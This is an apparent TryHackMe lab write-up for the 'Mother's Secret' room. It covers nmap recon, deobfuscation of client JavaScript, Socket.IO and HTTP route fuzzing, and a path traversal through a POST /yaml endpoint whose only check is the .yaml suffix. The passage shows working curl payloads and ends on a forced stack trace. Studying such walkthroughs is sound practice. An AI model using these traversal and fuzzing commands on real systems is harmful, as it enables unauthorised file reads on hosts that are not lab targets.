---
description: "A Node/Express app taken apart from the browser down: obfuscated client JS, Socket.IO auth gates, and a path traversal in a YAML loader that reads files far outside the intended tree."
---

# Mother's Secret — THMCSS Nostromo / MU-TH-UR 6000

**TryHackMe · challenge room · target: web application on a single host**

These are running notes. Every step was written down *before* it was run, and the result was
pasted back in underneath — including the steps that went nowhere. If you are studying for PT1,
the dead ends are the part worth reading twice; the working command is the easy bit.

> **Flags are redacted in this write-up.** Every `Flag{...}` and the base64 blob that encodes one
> are replaced with `[redacted]`. The commands, the traversal payloads and the reasoning are all
> intact — work the box and you get the real values, which is the only way they teach you anything.

The instance for this session was `10.128.135.177`. THM hands you a fresh IP every time, so from
here on the notes use a shell variable:

```bash
export IP=10.128.135.177
```

Set that once at the top of your terminal and every command below copy-pastes unchanged.

---

## 0. Scope — what "done" looks like

The brief:

> Investigate the TryHackMe Cargo Star Ship (THMCSS) Nostromo, owned by the Weyland-TryHackMe
> Corps, and its compromised computer system MU-TH-UR 6000. Uncover hidden secrets by exploiting
> vulnerabilities in the web application.

So: **one host, one web app, secrets hidden behind an application-layer flaw.** The room's own
words point at "code analysis" — that is a strong hint that the source of the app will be readable
somewhere, and that the bug will be a logic bug rather than a memory-corruption bug.

**Done =** I hold the flag string(s) the room asks for, and I can name the exact vulnerability class
that produced them, with the command that proves it.

**Load-bearing unknowns**, in the order they matter:

1. What is actually listening — is it only a web app, or is there SSH/FTP/something else to pivot
   through?
2. What framework is the app written in, and can I read its source?
3. Where does the app make a trust decision it should not?

Everything else is downstream of those three.

**Methodology phases** used below, in the PT1 order: **Recon → Enumeration → Exploitation →
Post-exploitation → Reporting.**

---

## 1. Recon — is the host even up, and what is listening?

**Plan (written before running):** start with a full TCP port sweep rather than nmap's default
top-1000. On a themed CTF box the interesting service is very often on a high, non-standard port,
and the default scan silently misses everything above 1024 that is not well known. Cost of being
thorough here is about a minute; cost of missing a port is an hour of confusion later.

Two-pass approach, which is the habit worth building for the exam:

- **Pass 1 — fast and wide:** every one of the 65535 TCP ports, no service detection. Find out
  *where* things are.
- **Pass 2 — slow and deep:** only against the ports pass 1 found, with version detection and
  default scripts. Find out *what* they are.

```bash
nmap -p- --min-rate 5000 -T4 -Pn -n -oN nmap-allports.txt $IP
```

| Flag | Why |
|---|---|
| `-p-` | All 65535 TCP ports, not just the top 1000 |
| `--min-rate 5000` | Send at least 5000 packets/sec — turns a 30-minute scan into ~30 seconds on a lab network |
| `-T4` | Aggressive timing template: shorter timeouts, more parallelism |
| `-Pn` | Skip host discovery. THM boxes commonly drop ICMP, and without this nmap declares the host down and scans nothing |
| `-n` | No reverse DNS. Saves time, and there is no useful PTR record on a lab VPN anyway |
| `-oN` | Save normal-format output to a file so I can grep it later instead of re-scanning |

Result:

```
Nmap scan report for 10.128.135.177
Host is up (0.017s latency).
Not shown: 65533 closed tcp ports (reset)

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 6.79 seconds
```

Six seconds for all 65535 ports, and `ttl=62` on the ping reply — a Linux host (initial TTL 64)
two hops away through the VPN. Exactly two ports:

- **22/tcp** — SSH. No credentials yet, so it is a *destination*, not an entry point. Park it.
- **80/tcp** — HTTP. This is the challenge; the brief said web application, and the scan agrees.

`Not shown: 65533 closed tcp ports (reset)` is worth reading rather than skipping. **Closed**, not
**filtered** — the host actively sent a TCP RST for every other port. There is no firewall dropping
packets silently, so I can trust this scan: two ports is genuinely the whole attack surface.

**Pass 2 — version detection on just those two ports.**

```bash
nmap -p 22,80 -sV -sC -Pn -n -oN nmap-services.txt $IP
```

| Flag | Why |
|---|---|
| `-p 22,80` | Only the ports pass 1 found. Never re-scan all 65535 with `-sV` — it is enormously slower for zero extra information |
| `-sV` | Version detection: probe each port and fingerprint the software and version |
| `-sC` | Run the default NSE script set — grabs HTTP titles, SSH host keys, checks common misconfigurations |

Result:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 a0:36:4b:2a:46:60:ec:e8:c8:ff:0f:8f:e2:76:8a:ff (RSA)
|   256 4e:52:a2:b7:ed:54:df:de:86:8e:d9:1f:9b:01:87:a0 (ECDSA)
|_  256 9a:70:03:75:6a:b6:80:ce:6a:e5:07:16:53:c6:52:9c (ED25519)
80/tcp open  http    Node.js Express framework
|_http-title: Mothers Secret
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Three facts that shape everything after this.

**`OpenSSH 8.2p1 Ubuntu 4ubuntu0.9`.** That is the stock package for Ubuntu 20.04 LTS, fully
patched. There is no remote pre-auth exploit worth chasing here. Note it and move on — the
temptation to `searchsploit openssh 8.2` is a beginner reflex that burns twenty minutes and
returns username-enumeration bugs you do not need.

**`Node.js Express framework`.** Now I know the stack. Express is a JavaScript web framework, which
tells me what to expect and what to look for:

- Routes are defined in code (`app.get('/whatever', ...)`), *not* mapped to files on disk. A
  directory brute-force will therefore be much less productive than on a PHP or classic-CGI app —
  there is no `/admin.php` sitting in a webroot, only whatever strings the developer typed.
- The API will very likely speak JSON.
- Express apps are frequently deployed with client-side JavaScript that calls those routes, and
  that client-side code is *downloaded to me*. **That** is the "code analysis" the brief mentioned.

**`http-title: Mothers Secret`.** Right box, and it is serving a real page rather than a default
placeholder.

The plan updates itself: the web app is the only way in, and reading its JavaScript is a higher-value
first move than brute-forcing paths.

---

## 2. Enumeration — read the application before attacking it

**Plan (written before running):** fetch the front page with headers before looking at anything
rendered. Headers first, because they are cheap and they routinely leak the stack, a session-cookie
name, or a redirect that tells me where the app really lives.

```bash
curl -i http://$IP/
```

| Flag | Why |
|---|---|
| `-i` | Include response headers in the output as well as the body |

Result:

```
HTTP/1.1 200 OK
X-Powered-By: Express
Accept-Ranges: bytes
Cache-Control: public, max-age=0
Last-Modified: Tue, 22 Aug 2023 19:46:18 GMT
ETag: W/"435-18a1ec89b6d"
Content-Type: text/html; charset=UTF-8
Content-Length: 1077
```

```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <link rel="stylesheet" href="./style/style.css" />
    <script src="https://cdn.tailwindcss.com"></script>
    <title>Mothers Secret</title>
  </head>
  <body class="body">
    <div class="wrapper flex flex-col overflow-hidden max-h-screen relative">
      <div class="crew-member absolute ...">Crew Member</div>
      <div class="overflow-hidden w-full h-full bg-[#ab964d] z-10 p-2 dots-container"></div>
    </div>
    <script src="https://cdn.socket.io/4.4.1/socket.io.min.js"></script>
    <script src="./index.min.js"></script>
  </body>
</html>
```

Reading this properly, because almost everything I need is here.

**`X-Powered-By: Express`** confirms nmap's guess from the app's own mouth. Express sets this header
by default and most people never turn it off.

**`Accept-Ranges: bytes` + `Last-Modified` + `ETag`** on the root path means this is not a rendered
template — Express is serving a *static file from disk* via `express.static()`. That matters: if a
static directory is mounted, other files in that directory are fetchable too, and `express.static`
does not care whether the developer intended you to have them.

**`Last-Modified: Tue, 22 Aug 2023`** — the app was frozen in August 2023. Useful for dating any
dependency versions I find.

**The page itself does almost nothing.** An empty `dots-container` div, a label reading
"Crew Member", and two scripts. Nothing is rendered server-side. All the behaviour is in JavaScript,
which means all the behaviour is *downloadable by me*.

**`https://cdn.socket.io/4.4.1/socket.io.min.js`** is the important line. Socket.IO is a WebSocket
library — the app does not communicate over ordinary HTTP requests, it opens a persistent socket and
exchanges named **events** with the server. That reframes the whole target:

- Directory brute-forcing is now close to pointless. There are no interesting URLs to find; the
  interesting surface is a list of *event names*.
- The classic web bug classes that need a URL (path traversal, most SQLi entry points, IDOR on a
  REST path) are not where the action is.
- Whatever authorisation this app has, it is enforced — or not — inside a socket event handler.

**`./index.min.js`** is the client half of that conversation, sitting on the server, downloadable
without authentication. Reading it will hand me the event names.

**Plan (written before running):** download `index.min.js` and read it. It is minified, so I will
pretty-print it rather than squinting at one long line.

```bash
curl -s http://$IP/index.min.js -o index.min.js
wc -c index.min.js
```

| Flag | Why |
|---|---|
| `-s` | Silent — no progress meter cluttering the terminal |
| `-o` | Write to a file instead of stdout, so I can process it repeatedly without re-fetching |

Result:

```
8463 index.min.js
```

8.4 KB, and the first line looks like this:

```js
const _0x267948=_0x42b1;(function(_0x393fcf,_0x4cd75b){const _0xb3790a=_0x42b1,_0x9d637f=_0x393fcf();
while(!![]){try{const _0x407b49=-parseInt(_0xb3790a(0x10a))/0x1+parseInt(_0xb3790a(0x105))/0x2*...
```

This is **obfuscated JavaScript** — the output of a tool like `obfuscator.io`. It is worth
understanding the pattern, because you will meet it constantly and it defeats people who assume it
is encryption. It is not. It is three simple tricks stacked:

1. **Every string is moved into one array**, here the function `_0x5f26()` at the bottom, and each
   use is replaced by a lookup: `_0x267948(0xf4)` instead of `'/yaml'`.
2. **The array is rotated at load time.** That is the `while(!![])` loop at the top: it keeps doing
   `push(shift())` — moving the first element to the end — until an arithmetic checksum over a
   handful of indices matches a magic number (`0xd18ff`). Only then do the offsets line up. This is
   purely there to stop you from mapping index → string by hand.
3. **Identifiers are renamed** to `_0x`-hex noise, so nothing is self-documenting.

None of that removes information. The strings are all still there, in plaintext, in the file. The
control flow is unchanged. `!![]` is just `true` and `![]` is just `false`.

**Two ways to read it:**

- The lazy way — the string array is legible without any work at all. Just look at it.
- The correct way — let the code deobfuscate itself. The rotation is deterministic, so if I run the
  string-array machinery in Node I can dump the *real* index → string mapping and substitute it
  back. That way I do not guess which string belongs to which call.

**Start lazy**, because it costs one command and the string array is where the hints live:

```bash
grep -o "'[^']\{4,\}'" index.min.js | sort -u | head -40
```

That greps for single-quoted strings of 4+ characters and de-duplicates them. Two entries stop me
dead:

> `Embedded within the intricate codes of Mother's system lies the **Alien Loader**, a peculiar
> **YAML loader** function. This function **parses and loads YAML data**. Be cautious, as this
> loader holds the truths to unveil the hidden paths.`

> `[!]CAUTION[!] The Nostromo holds countless winding corridors and concealed chambers, harboring
> secrets that lie **beyond the intended boundaries**. Embrace the power of **relative file paths**
> within MOTHER, to uncover SECRETS and traverse the labyrinthine structure of the ship and reach
> your desired destinations.`

Those are not flavour text. They are the room telling you the two vulnerability classes outright:

- **"YAML loader … parses and loads YAML data"** → unsafe YAML deserialisation. In Node that means
  `js-yaml`'s `load()` with a schema that permits `!!js/function`, which is remote code execution.
- **"relative file paths … beyond the intended boundaries"** → **path traversal** (`../../..`).

Also in the array, two base64 blobs:

```bash
echo 'Q0xBU1NJRklFRA==' | base64 -d          # -> CLASSIFIED
echo 'VEhNX0ZMQUd7…fQ==' | base64 -d
```

```
CLASSIFIED
THM_FLAG{[redacted]}
```

**That is a flag, sitting in a static file, readable without touching the vulnerabilities at all.**
Order 937 is the Alien reference — Mother's directive to bring the organism back and treat the crew
as expendable. Look at how the app uses it:

```js
let contentx = [ ..., ..., ..., atob('Q0xBU1NJRklFRA==') ];   // "Flag" box shows CLASSIFIED

const modifyData = () => {
  contentx[2] = 'nostromo';
  contentx[3] = atob('VEhNX0ZMQUd7…fQ==');          // ...becomes the flag
  document.querySelector('.crew-member').innerHTML = 'nostromo';
};

yamlSocket.on(<event>,     () => { authYaml = true;      if (authNostromo && authYaml) modifyData(); });
nostromoSocket.on(<event>, () => { authNostromo = true;  if (authNostromo && authYaml) modifyData(); });
```

The client is *supposed* to reveal that flag only after **both** sockets report success. But the
check is `if (authNostromo && authYaml)` **in the browser**, over a value the browser itself sets,
against a string the browser already has. There is no server round-trip for the secret — it ships
with the page. This is the textbook flaw the room is quietly demonstrating first:

> **Client-side controls are not access controls.** Anything the browser can eventually display,
> the browser already possesses. Obfuscation delays the reader; it does not stop them.

Filed as **flag #1**, obtained by reading, not exploiting. I will still do the intended work —
the point is the method, and there are more secrets on this ship.

**Plan (written before running):** stop reading by eye and deobfuscate properly. I need the exact
**socket event names** the client listens for, and those are index lookups (`_0x156a2c(0x10d)`),
not literals. Guessing them would be a bad habit; the array is rotated, so index → string is not
the order printed in the file.

The trick: the deobfuscated program *contains its own decoder*. I extract the string-array function
`_0x5f26`, the accessor `_0x42b1` and the rotation IIFE, run **only those** in Node — no DOM, no
network, no `io()` — and then print every index the file actually references. Running the string
machinery is safe: it is pure arithmetic over an array of constants, and I never execute the parts
that touch `document` or open a socket.

```bash
node deobf.js
```

Result:

```json
0{"sid":"9jCzWQGn6vhqWvfPAAAA","upgrades":["websocket"],"pingInterval":25000,"pingTimeout":20000,"maxPayload":1000000}
```

```bash
curl -s "http://$IP/socket.io/?EIO=3&transport=polling"
```

```json
{"code":5,"message":"Unsupported protocol version"}
```

Clean answer: **Engine.IO 4 only**, so the server is Socket.IO v3/v4 and my client must be v4. The
`0` prefix is the Engine.IO packet type for `open`, and `upgrades:["websocket"]` says it will start
on HTTP long-polling and upgrade to a real WebSocket. Good to know, but the client library handles
that for me.

**Plan (written before running):** install `socket.io-client@4` in the scratchpad and write a small
script that connects to both namespaces, prints **every** event it receives with
`socket.onAny()`, and stays open for a few seconds. I want to see what the server volunteers before
I start guessing what to send it.

`onAny` is the important part — a normal `socket.on('name', ...)` only fires for one event name I
have to know in advance. `onAny` is a wildcard listener: it fires for every event the server emits
whatever its name, which is exactly the tool for enumerating an unknown socket API.

```bash
npm init -y >/dev/null && npm install socket.io-client@4 --silent
node listen.js
```

Result:

```
[/] connected  id=kvaVPyWlFzLbF4KSAAAC
[/yaml] connected  id=TuVPA4mAJYkxgRDhAAAD
[/nostromo] connected  id=AvQVLoY_4DUBYx1aAAAE
```

All three namespaces accept a connection — including `/`, which the client never really uses — and
then **the server says nothing at all**. Eight seconds of silence, no greeting event, no error.

That is a meaningful negative result, so it is worth stating plainly rather than treating it as a
failure: the server is purely reactive. It will not hand me the API. I have to emit first, and I
still do not know the event names.

**Dead end #1, and the reasoning that got me out of it.** My first instinct was to go hunting for
the server source via a directory brute-force, on the theory that whoever deployed this might have
left `app.js` in the static folder. That is a real thing that happens. But look again at the header
evidence from step 2: `express.static` is serving a *public* directory, and the server file
essentially never lives inside it. Spending five minutes on `ffuf` here would be reflex, not
reasoning.

The better move costs one command. Socket.IO servers in small apps are overwhelmingly written as a
symmetric echo:

```js
socket.on('yaml', (data) => { /* ...work... */ socket.emit('yaml', result); });
```

The event the server **emits** on success is `yaml` on `/yaml` and `nostromo` on `/nostromo` — I
already know that from the client. The cheapest hypothesis is that the event it **listens** for has
the same name. That is worth exactly one test before any brute-forcing.

**Plan (written before running):** emit `yaml` on `/yaml` and `nostromo` on `/nostromo` with
harmless probe data, keep `onAny` attached, and see if anything comes back.

```bash
node probe.js
```

Result:

```
[/yaml] emit yaml
[/nostromo] emit nostromo
```

Silence again. The symmetric-echo guess was wrong. Two explanations survive, and they need
different fixes:

1. The event names are different from the ones the server emits.
2. The names are right but the **payload shape** is wrong — a handler doing `data.path` on my plain
   string would throw, and Socket.IO swallows handler exceptions rather than telling the client.

Before fuzzing, one more cheap probe. Missing files might be handled by a catch-all route, and how
a catch-all behaves tells me something about the code.

```bash
for p in index.js app.js server.js package.json .git/HEAD style/style.css; do
  curl -s -o /dev/null -w "%{http_code} %{size_download}  /$p\n" http://$IP/$p
done
```

| Flag | Why |
|---|---|
| `-o /dev/null` | Throw the body away — I only want the status line |
| `-w` | Print a custom format: status code, byte count, and which path produced it |

Result:

```
500 42  /index.js
500 42  /app.js
500 42  /server.js
500 42  /package.json
500 42  /.git/HEAD
200 4469  /style/style.css
```

**500, not 404.** Every miss returns the same 42-byte body:

```json
{"status":"You just hit the wrong route."}
```

So there is an explicit catch-all handler. Worth one traversal attempt on the HTTP side while I am
here, using percent-encoded dot-segments — Express normalises literal `../` out of the path very
early, but people sometimes hand-roll path handling *after* decoding:

```bash
curl -s "http://$IP/%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
```

```json
{"status":"You just hit the wrong route."}
```

No. The traversal the room hinted at is **not on the HTTP surface** — it is inside a socket handler,
exactly as the hint said ("relative file paths **within MOTHER**"). Good: a negative result that
narrows the search instead of widening it.

**Plan (written before running):** fuzz the socket event names. The design of the fuzzer matters more
than the wordlist, so:

- Emit each candidate name on **both** namespaces, since I do not know which handler is where.
- Send **each of several payload shapes** per name — a bare string, and objects keyed `path`, `file`,
  `data`, `yaml`, `name`. This covers explanation (2) above at the same time as (1) rather than
  needing a second pass.
- Attach an **acknowledgement callback** to every emit. Socket.IO lets a handler reply directly to
  the caller via `callback(...)`; if the server uses acks rather than `emit`, `onAny` would never
  see it and I would wrongly conclude the name was wrong.
- Keep `onAny` attached as well, to catch broadcast-style replies.

The wordlist comes from the app's own vocabulary — the four box labels, the namespaces, the ship
lore — plus the generic verbs a developer reaches for. Themed wordlists beat generic ones on CTF
boxes because the developer named the handler after the story.

```bash
node fuzz-events.js
```

Result:

```
--- done, 0 responses ---
```

**Zero.** Roughly a thousand emits — 57 names × 6 payload shapes × 3 namespaces — and not one
acknowledgement, not one event.

Stop. **Two failed attempts at the same fix mean the diagnosis is wrong.** Both the echo guess and
the fuzz rest on one shared, untested premise:

> *The thing I have to send is a Socket.IO event.*

Rather than write attempt three with a bigger wordlist, test the premise. And the evidence to
falsify it has been sitting in front of me since step 2 — I just read it as decoration:

**The client never emits, and it never will.** It only listens. If the intended flow were
"browser sends payload over socket", the developer would have shipped an emit. There isn't one, in
8.4 KB of code whose entire job is this app.

So what makes `authYaml` become true? Someone else triggers it. The success events must be
**broadcast to the namespace** by the server — `io.of('/yaml').emit('yaml', ...)` — when the
vulnerability is exploited **through a different channel**. The socket is the *scoreboard*, not the
attack surface.

And the catch-all proves that channel exists: `{"status":"You just hit the wrong route."}` is a
message written by someone who has **right** routes to compare against. A generic Express app with
no routes would 404. That string is the developer telling me there is a route table I have not found.

The plan changes: **the attack surface is HTTP, and I need the route names.** Which makes the
directory brute-force I talked myself out of earlier the correct move after all — not because
brute-forcing is good practice by default, but because the evidence now points at named routes
rather than files on disk.

> **Worth pausing on.** I skipped `ffuf` earlier with sound reasoning: Express routes are code, not
> files, so directory brute-forcing is weak against it. That reasoning was right about *files* and
> wrong about *routes*. A wordlist still hits `/upload` or `/api/load` if the developer used an
> ordinary word — which developers do, because routes are meant to be readable. The lesson is not
> "always brute-force", it is that a rule of thumb is a prior, not a verdict, and this box moved
> the evidence.

**Plan (written before running):** brute-force HTTP paths with `ffuf`. The catch-all makes this
easy in one specific way — every wrong path returns **exactly** 500 with **exactly** 42 bytes, so
instead of filtering on status codes I filter on **size**. Anything that is not 42 bytes is a real
route.

```bash
ffuf -u http://$IP/FUZZ -w /usr/share/wordlists/dirb/common.txt -fs 42 -t 50 -c
```

| Flag | Why |
|---|---|
| `-u .../FUZZ` | `FUZZ` is the placeholder ffuf substitutes each wordlist entry into |
| `-w` | Wordlist. `dirb/common.txt` is ~4600 entries — a fast first pass before reaching for a bigger list |
| `-fs 42` | **Filter out** responses of size 42 bytes — the catch-all. This is the whole trick: it silences every miss regardless of status code |
| `-t 50` | 50 concurrent threads |
| `-c` | Colourise output |

Filtering on size rather than status matters here. `-fc 404` would have filtered nothing, because
this app never returns 404 — a beginner running the default ffuf invocation sees 4600 "hits" and
concludes the tool is broken.

Result:

```
style
```

One hit, and it is the stylesheet directory I already knew about. 4614 words, nothing else.

Then the obvious follow-up, because a GET sweep is blind to a route registered as `app.post(...)` —
Express falls through to the same catch-all, so a POST-only route looks exactly like a miss:

```bash
ffuf -u http://$IP/FUZZ -w /usr/share/wordlists/dirb/common.txt \
     -X POST -H "Content-Type: application/json" -d '{"a":"b"}' -fs 42 -t 50
```

```
(nothing)
```

Nothing at all this time — not even `/style`, since POSTing to a static directory also lands on the
catch-all. So: **no discoverable HTTP routes under a generic English wordlist, in either method.**

**Dead end #2.** And this one is more useful than it looks, because it kills the "hidden HTTP route"
theory pretty firmly. If the app had a `/upload` or `/api/load`, `dirb/common.txt` would have found
it — that list is nothing but ordinary English words.

So back to the premise I abandoned. Re-reading the evidence with fresh eyes, there is a fact I
skipped past far too quickly:

**All three namespace connections succeeded, including `/`.** In Socket.IO v4 that is not a
freebie. Connecting to a namespace the server has not defined fails with an
`Invalid namespace` connect error. I saw `connected id=...` for `/yaml` and `/nostromo`, so **both
namespaces are registered server-side** — and a namespace exists precisely so that a
`connection` handler can register `socket.on(...)` listeners inside it.

The listeners are there. My wordlist was simply too small: 57 hand-picked names is not a fuzz, it is
a guess with extra steps. The right move is to fuzz event names the way I would fuzz paths — with an
actual wordlist.

**Plan (written before running):** replay the *path* wordlist as *event names* over the websocket.
4614 names × 2 namespaces is trivial over a single open socket — no TCP handshake per attempt, no
rate limit to speak of — so this costs seconds, not minutes. Payload stays a plain string, and both
`onAny` and an ack callback stay attached.

```bash
node fuzz-events-wordlist.js
```

Result:

```
wordlist: 4612 names
all emitted, waiting...
--- done, 0 responses ---
```

9224 emits, zero responses. That settles it: **the sockets are not the input.** They are output only.

Which means the HTTP route theory was right and my *wordlist* was wrong. Look at what
`dirb/common.txt` contains — `admin`, `backup`, `cgi-bin`, `login`. Now look at what this app is
named after. The developer did not call the route `/upload`. They called it after the ship.

**A generic wordlist cannot find a themed route.** So write the wordlist from the target's own
vocabulary — every proper noun in the client code and the brief — and try both methods, since I
already know POST-only routes are invisible to a GET sweep:

```bash
for p in yaml nostromo mother muthur alien loader ash order937 secret crew ship flag \
         role pathways path load api api/yaml api/nostromo upload files; do
  for m in GET POST; do
    r=$(curl -s -o /dev/null -w "%{http_code}:%{size_download}" -X $m \
        -H "Content-Type: application/json" -d '{"a":"b"}' "http://$IP/$p")
    [ "$r" != "500:42" ] && echo "$m /$p -> $r"
  done
done
```

The `[ "$r" != "500:42" ] &&` is the same size-filter idea as `ffuf -fs 42`, hand-rolled: print only
what differs from the catch-all.

Result:

```
POST /yaml         -> 500:52
POST /api/nostromo -> 500:56
```

**Two routes**, both POST-only, both themed, both invisible to the earlier sweep. Their bodies:

```bash
curl -s -X POST -H "Content-Type: application/json" -d '{"a":"b"}' http://$IP/yaml
curl -s -X POST -H "Content-Type: application/json" -d '{"a":"b"}' http://$IP/api/nostromo
```

```json
{"status":"error","message":"Not a YAML file path."}
{"status":"error","message":"Science Officer Eyes Only"}
```

Note the asymmetry that would have wasted more time if I had assumed it: it is `/yaml` but
`/api/nostromo`. No consistent prefix. `POST /api/yaml` and `POST /nostromo` both fall through to
the catch-all.

Now the two hints line up with two routes:

| Route | Error | Hint it matches |
|---|---|---|
| `POST /yaml` | `Not a YAML file path.` | Alien Loader — YAML parsing |
| `POST /api/nostromo` | `Science Officer Eyes Only` | relative file paths / traversal, behind some authorisation |

`Science Officer Eyes Only` is a gate — the science officer on the Nostromo is **Ash**, the same
name `modifyData()` writes into the crew badge. So `/api/nostromo` needs an identity I do not have
yet, and `/yaml` does not. Do `/yaml` first.

**Plan (written before running):** `Not a YAML file path.` says the handler read a parameter, found
nothing usable, and bailed. I need the parameter's **name**. Fuzz JSON body keys with the same
size-filter trick — anything whose response differs from the 52-byte error is a hit.

```bash
ffuf -u http://$IP/yaml -X POST -H "Content-Type: application/json" \
     -d '{"FUZZ":"test.yaml"}' -w /usr/share/wordlists/dirb/common.txt -fs 52 -t 40
```

| Flag | Why |
|---|---|
| `-d '{"FUZZ":"test.yaml"}'` | `FUZZ` sits in the **key** position, so ffuf fuzzes parameter names, not values |
| `-fs 52` | Filter out the 52-byte `Not a YAML file path.` response — the "wrong key" baseline |

Result:

```
(no output)
```

Nothing on either route. So the parameter name is not an ordinary English word either — same lesson
as the routes, one level down. Hand-picked candidates, mixing naming conventions, since the route
names told me this developer does not stick to one style:

```bash
for k in yamlFile yaml_file filePath file_path configPath alienLoader alien loader \
         yamlPath content body input; do
  r=$(curl -s -X POST -H "Content-Type: application/json" -d "{\"$k\":\"test.yaml\"}" http://$IP/yaml)
  echo "$k -> $r"
done
```

```
yamlFile   -> {"status":"error","message":"Not a YAML file path."}
filePath   -> {"status":"error","message":"Not a YAML file path."}
file_path  -> {"status":"error","message":"Failed to read the file."}     <-- different!
configPath -> {"status":"error","message":"Not a YAML file path."}
...
```

**`file_path`.** A different error message is a hit. `Failed to read the file.` means the handler
accepted my parameter, built a path from it, called something like `fs.readFileSync`, and that call
threw ENOENT because `test.yaml` does not exist. I have crossed from "the app ignores me" to "the
app is doing filesystem work with my input".

Two error strings, two distinct stages, and together they are a free oracle:

| Response | What it means |
|---|---|
| `Not a YAML file path.` | My input failed a **validation** check before any I/O |
| `Failed to read the file.` | Validation passed, the **read was attempted** and failed |

That distinction is the most valuable thing on this box. It lets me test the filesystem blind — the
app is telling me whether a file exists.

First, what does validation actually enforce?

```bash
for f in /etc/passwd test.yaml test.yml index.html package.json; do
  printf '%-16s -> ' "$f"
  curl -s -X POST -H "Content-Type: application/json" -d "{\"file_path\":\"$f\"}" http://$IP/yaml
  echo
done
```

```
/etc/passwd      -> Not a YAML file path.
test.yaml        -> Failed to read the file.
test.yml         -> Not a YAML file path.
index.html       -> Not a YAML file path.
package.json     -> Not a YAML file path.
```

**The only rule is that the path ends in `.yaml`.** Not `.yml` — the developer wrote an exact
suffix check. And note what is *not* enforced: nothing about directories, nothing about `..`, no
canonicalisation. The whole validation is "does the string end in `.yaml`", which is the classic
extension-check-instead-of-path-check mistake.

Which means the traversal hint should just work, provided the target file ends in `.yaml`. On an
Ubuntu 20.04 host there is a guaranteed one: **netplan's network config**. This is a good probe
because I know it exists, I know it is valid YAML, and it is not sensitive.

```bash
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"file_path":"../../../../etc/netplan/50-cloud-init.yaml"}' http://$IP/yaml
```

Result:

```json
{"network":{"ethernets":{"ens5":{"dhcp4":true,"dhcp6":false,
 "match":{"macaddress":"06:75:54:bd:56:ab"},"set-name":"ens5"}},"version":2}}
```

**Path traversal confirmed, and arbitrary-file-read achieved** — with the one restriction that the
path must end in `.yaml`. Two details worth noticing in that reply:

- The absolute form `/etc/netplan/50-cloud-init.yaml` **failed**, while the relative `../../../../`
  form worked. That is the signature of `path.join(someBaseDir, userInput)` — `path.join` treats a
  leading `/` as just another segment, so the absolute path gets glued onto the base and points
  nowhere. `../` segments, on the other hand, `path.join` happily *resolves*, walking out of the
  base directory. Using `path.join` and assuming it confines you is the bug.
- The response is **parsed YAML re-serialised as JSON**, not raw text. So the app is running the
  file through a YAML loader — the "Alien Loader" — and handing me the object.

**Mapping the depth**, because knowing where the app lives will matter later:

```bash
for d in 1 2 3 4 5 6; do
  p=$(python3 -c "print('../'*$d)")
  curl -s -X POST -H "Content-Type: application/json" \
       -d "{\"file_path\":\"${p}etc/netplan/50-cloud-init.yaml\"}" http://$IP/yaml
done
```

```
depth 1..3 -> Failed to read the file.
depth 4    -> {"network":...}      <-- first success
depth 5,6  -> {"network":...}      <-- still works
```

Depth 4 is the first that works, so the base directory is **exactly four levels below `/`** —
something like `/A/B/C/D`. Depths 5 and 6 still work because `..` at `/` is just `/` again, which is
a handy fact: **over-shooting is free**, so in a real engagement use plenty of `../` rather than
counting.

**Now the second route.** `/api/nostromo` still answers `Science Officer Eyes Only` to everything.
I threw the obvious identity guesses at it — headers and body fields both:

```bash
for h in "X-Role: ash" "Role: science officer" "Authorization: Bearer ash" \
         "X-Forwarded-For: 127.0.0.1" "Cookie: role=ash"; do ... done
for k in role user username officer crew auth token clearance; do ... done
```

Every one returned the identical 56-byte gate message. I also tried to make it leak a stack trace by
sending wrong-typed parameters — an object and an array where a string belongs — which sometimes
crashes a handler into Express's default error page complete with absolute file paths:

```bash
curl -s -X POST -H "Content-Type: application/json" -d '{"file_path":{"a":1}}' http://$IP/yaml
curl -s -X POST -H "Content-Type: application/json" -d '{"file_path":["a.yaml"]}' http://$IP/yaml
```

```
{"status":"error","message":"Not a YAML file path."}
{"status":"error","message":"Failed to read the file."}
```

No stack trace — the handler is wrapped in try/catch. (Small aside: the array **passed** validation.
`["a.yaml"]` stringifies to `a.yaml`, so the check must be a regex test or a comparison that coerces
its argument, rather than `String.prototype.endsWith` which would have thrown on an array. Not
useful here, but that is exactly how type-confusion bugs are found.)

So `/api/nostromo` needs a secret I do not have. The hint said the YAML loader *"holds the truths to
unveil the hidden paths"* — read as instructions rather than flavour, that says: **use the YAML read
to find what the other route wants.**

**Plan (written before running):** I have been assuming two routes. Test that. The `/api/` prefix
exists, so sweep it properly with POST, filtering out the catch-all size.

```bash
ffuf -u http://$IP/api/FUZZ -X POST -H "Content-Type: application/json" \
     -d '{"a":"b"}' -w /usr/share/wordlists/dirb/common.txt -fs 42 -t 40
```

Result:

```
(nothing, POST or GET)
```

Two routes is all there is. I also swept `/FUZZ.yaml` and `/FUZZ.yml` over plain HTTP in case the
app's own YAML sat in the static directory, and ran ~1700 themed `.yaml` filename guesses through
the LFI at three different depths. All empty. At this point I had spent a while assuming the
answer was a **file I had to name**, and had no evidence for it.

---

## 3. The stack trace that unlocked everything

**Plan (written before running):** stop guessing names and make the app talk about itself. I tried
type confusion on the parameter earlier and the handler's try/catch swallowed it — but the handler
is not the only code that can throw. **`express.json()` runs before the handler**, and if the body is
not valid JSON, body-parser throws a `SyntaxError` that no route try/catch will ever see. It goes
straight to Express's default error handler, which — unless `NODE_ENV=production` — renders the
**full stack trace**.

So: send deliberately malformed JSON.

```bash
curl -s -X POST -H "Content-Type: application/json" -d '"broken' http://$IP/api/nostromo
```

The body `"broken` is an unterminated JSON string. The `Content-Type` header is the important part —
it is what makes `express.json()` try to parse at all.

Result:

```
SyntaxError: Unexpected token '"', "#" is not valid JSON
    at JSON.parse (<anonymous>)
    at createStrictSyntaxError (/home/ubuntu/mothers_secret_challenge/node_modules/body-parser/lib/types/json.js:160:10)
    at parse (/home/ubuntu/mothers_secret_challenge/node_modules/body-parser/lib/types/json.js:83:15)
    at /home/ubuntu/mothers_secret_challenge/node_modules/body-parser/lib/read.js:128:18
